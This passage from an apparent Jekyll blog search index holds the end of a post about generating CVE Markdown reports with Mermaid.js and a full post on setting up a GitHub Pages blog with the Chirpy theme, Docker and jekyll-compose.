C;D -.-&gt; E[Done]The most elusive part of any software project is getting to that last step. Done. This project is no different. Like most software projects, I started with a problem and came up with a quick solution that got me most of the way there (the 80% solution). My hope of being satisfied with a quick script faded as I thought about new use cases, new features, and converting this script into something much bigger. The typical issue of a working solution snowballing into several new ideas and features once again emerged.Some thoughts for next steps include: Replace cve.mitre.org web scraping with pure JSON from services.nvd.nist.gov/rest/json/cves/1.0/ Support a list of CVEs as input Add more charts Scrap the python script entirely and build some sort of free CVE Markdown generator serviceTime and motivation will determine how quickly I accomplish these tasks, but it’s always fun to have the next project in mind. I hope I encouraged you to at least check out Mermaid.js for your next blog or research report. Until next time…If you have thoughts, ideas, or corrections let me know @clearbluejar or create an issue.Cover photo by RODNAE Productions from Pexels" }, { "title": "These Are Your First Steps", "url": "/posts/these-are-your-first-steps/", "categories": "writing, jekyll", "tags": "blog, jekyll, docker, github, workflow", "date": "2022-02-17 13:29:12 +0000", "snippet": "Hello WorldSaying hello to the world with a first post. I have seen several slick github.io pages leveraging Jekyll to create modern blogs and websites that look great with seemingly little overhead. Not wanting to deal with SSL certificates, host my own server, or really do anything besides create content, I decided to give Github Pages a try.Jekyll Blogging - Chirpy ThemeThe Jekyll blogging engine seems to take all the hard work out of creating a modern web site. Just select a theme, generate your static web site, and focus on content.First things first. You need to select a theme. I selected the chirpy Jekyll template as it sports a clean design, light / dark mode, and focuses you on the content.The chirpy theme even has a corresponding starter template (chirpy starter the leverages github templates to kickstart your username.github.io repository (this is where you host your site).If you prefer another theme, there are plenty to choose from. Check out the list from Jekyll’s theme list or the topic in Github. Github Pages offer you some default themes, but I needed something like the chirpy starter to start to understand how to develop and publish with Jekyll.Site DevelopmentThe development cycle is quite straightforward if you like to be lazy smart and use docker. Jekyll has its own image. No dependencies to install!Clone your repo:$ git clone clearbluejar/clearbluejar.github.io$ cd clearbluejar.github.ioThen startup docker. The jekyll:jekyll docker image will build your site and host it locally:$ docker run -it --rm \\ --volume=\"$PWD:/srv/jekyll\" \\ -p 4000:4000 jekyll/jekyll \\ jekyll serveFetching gem metadata from https://rubygems.org/.........Using public_suffix 4.0.6Using bundler 2.2.24Using colorator 1.1.0Using concurrent-ruby 1.1.9... several line omitted ...Fetching jekyll-theme-chirpy 5.1.0Installing jekyll-theme-chirpy 5.1.0Bundle complete! 7 Gemfile dependencies, 44 gems now installed.Use `bundle info [gemname]` to see where a bundled gem is installed.ruby 2.7.1p83 (2020-03-31 revision a0c7c23c9c) [x86_64-linux-musl]Configuration file: /srv/jekyll/_config.yml Theme Config file: /usr/gem/gems/jekyll-theme-chirpy-5.1.0/_config.yml Source: /srv/jekyll Destination: /srv/jekyll/_site Incremental build: disabled. Enable with --incremental Generating... done in 4.505 seconds. Auto-regeneration: enabled for '/srv/jekyll' Server address: http://0.0.0.0:4000/ Server running... press ctrl-c to stop. Server address: http://0.0.0.0:4000/Once it is running, you can visit your site locally at http://localhost:4000.As you make changes to the site, jekyll will detect them and update them realtime.Regenerating: 1 file(s) changed at 2022-02-17 08:02:23 _posts/2021-02-17-my-new-post.md ...done in 3.214756529 seconds.Writing A New PostThere is even some tooling to generate a new post. Mostly following the advice from chirpy - Writing a New Post, install Jekyll-Compose and run one of the commands such as: bundle exec jekyll post \"My New Post\" --timestamp-format \"%Y-%m-%d %H:%M:%S %z\"The post will be available now within _posts:bash-5.0# bundle exec jekyll post \"These Are You First Steps\" --timestamp-format \"%Y-%m-%d %H:%M:%S %z\"Configuration file: /srv/jekyll/_config.ymlNew post created at _posts/2022-02-17-these-are-you-first-steps.mdIt will generate the post with some default YAML. Update your _config.yml with specific jekyll-compose settings as suggested:jekyll_compose: default_front_matter: posts: description: image: category: [TOP_CATEGORIE, SUB_CATEGORIE] tags: blog mermaid: trueThe new posts that you create will contain the default YAML front matter as specified by your config.DeploymentAfter I created this first post, these were my changes from my original repo:$ clearbluejar.github.io % git statusOn branch mainYour branch is up to date with 'origin/main'.Changes not staged for commit: (use \"git add &lt;file&gt;...\" to update what will be committed) (use \"git restore &lt;file&gt;...\" to discard changes in working directory) Untracked files: (use \"git add &lt;file&gt;...\" to include in what will be committed) Gemfile.lock _posts/2022-02-17-these-are-your-first-steps.md assets/img/A single file to post and the images I am linking within this article. Once you are ready, you simply need to commit your changes to master. Once these changes are committed, an automated Action will be performed on Github that will create a branch gh-pages (if it doesn’t exist). It leverages this workflow. Mostly, this workflow is just calling deploy.sh on the repository.Once the workflow finished, and you have already change your github pages settings to point to your new branch gh-pages, it will be available clearbluejar.github.io/.Workflow SummaryHope this helps. You can create, host, and establish a workflow for blog writing pretty quickly leveraging these technologies.graph TD A[fa:fa-user Create Github Pages Repo] --&gt;|Fork Jekyll Theme template to username.github.io| B[Create a New Post] B --&gt; C[fa:fa-keyboard Add Content] C --&gt; D{fa:fa-camera-retro Test Site with jekyll/jekyll docker image} D --&gt; | Make Edits | C D --&gt; | Done Editing | E[Finish, Commit, And Deploy Post] E --&gt; F[fa:fa-twitter Tweet link to let others know you are awesome] F --&gt; | Repeat | BHeadline Photo by Jukan Tateisi on Unsplash" } ]
